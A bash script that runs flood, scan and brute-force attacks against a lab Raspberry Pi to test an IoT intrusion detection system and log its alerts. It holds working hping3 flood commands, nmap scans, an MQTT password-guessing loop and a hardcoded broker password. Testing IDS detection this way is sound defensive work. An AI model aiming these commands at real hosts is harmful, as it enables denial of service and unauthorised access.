#!/bin/bash
# Run ALL laptop attacks against the real Pi, one after another, and save everything to log files.
# Run INSIDE WSL (Ubuntu-24.04):
#   cd /mnt/c/Users/HOME/Documents/iot/retrain/laptop
#   bash attack_all.sh 172.29.2.187
# BEFORE: on the Pi, start the IDS with a log file:   ./run_ids.sh admin <LAPTOP_IP> | tee lab_log.txt
# Takes ~12 min. Writes 2 small text files here (KBs, not GBs):
#   attack_log_<time>.txt       what was sent, with clock times
#   dashboard_alerts_<time>.txt every alert the dashboard got (name, confidence, top-3 SHAP reasons)
# TCP floods go to port 1883 (the lab's broker on the Pi), not 1884: the IDS hides the admin laptop's non-SYN packets
# to 1884 (its dashboard connection), so ACK / PSH-ACK / RST-FIN floods to 1884 would be invisible.
# Bots are not in here (they need the bot firmware): run them separately from PowerShell with laptop\bot.py.

PI=${1:?use: bash attack_all.sh <PI_IP> [all|floods|scans]}
T=$(date +%H%M)
LOG=attack_log_$T.txt
ALERTS=dashboard_alerts_$T.txt

mark() { echo "== $(date +%H:%M:%S) $*" | tee -a "$LOG"; }
run()  { mark "$1"; shift; echo "\$ $*" | tee -a "$LOG"; "$@" >> "$LOG" 2>&1; mark "pause 40 s"; sleep 40; }

mosquitto_sub -h "$PI" -p 1884 -u tinyids -P tinyids123 -t ids/alerts -v > "$ALERTS" &   # = what the dashboard shows
SUB=$!

mark "check: can WSL reach the Pi?"
if sudo hping3 -S -p 1883 -c 3 "$PI" 2>&1 | tee -a "$LOG" | grep -q "unreachable"; then
    echo "WSL cannot reach the Pi. In PowerShell: wsl --shutdown, reopen Ubuntu-24.04, run this again."
    kill $SUB; exit 1
fi

MODE=${2:-all}          # all = the full test | floods = only floods | scans = only scans (for recording)
if [ "$MODE" = all ]; then mark "1. normal traffic, 60 s (no attack)"; sleep 60; fi
if [ "$MODE" = all ] || [ "$MODE" = floods ]; then
run "2. SYN flood 15 s"      timeout -s INT 15 sudo hping3 -S  -p 1883 -i u1000 "$PI"
run "3. UDP flood 15 s"      timeout -s INT 15 sudo hping3 --udp -p 5683 -d 8 -i u1000 "$PI"
run "4. ICMP flood 15 s"     timeout -s INT 15 sudo hping3 --icmp -i u1000 "$PI"
run "5. ACK flood 15 s"      timeout -s INT 15 sudo hping3 -A  -p 1883 -i u1000 "$PI"
run "6. PSH-ACK flood 15 s"  timeout -s INT 15 sudo hping3 -PA -p 1883 -i u1000 "$PI"
run "7. RST-FIN flood 15 s"  timeout -s INT 15 sudo hping3 -RF -p 1883 -i u1000 "$PI"
fi
if [ "$MODE" = all ] || [ "$MODE" = scans ]; then
run "8. port scan (max 30 s)"    timeout 30 nmap -sT -T4 --host-timeout 30s -p 1-1024 "$PI"
run "9. version scan (max 30 s)" timeout 30 nmap -sV --host-timeout 30s --top-ports 100 "$PI"
fi
if [ "$MODE" = all ]; then
run "10. MQTT brute force" bash -c "for p in 123456 password admin 12345678 qwerty iot123 raspberry; do \
    timeout 3 mosquitto_pub -h $PI -p 1884 -u tinyids -P \$p -t test -m hi; done"
mark "11. normal traffic, 60 s (no attack)"; sleep 60
fi

kill $SUB
mark "done. Send these 2 files + the Pi's lab_log.txt:  $LOG  $ALERTS"
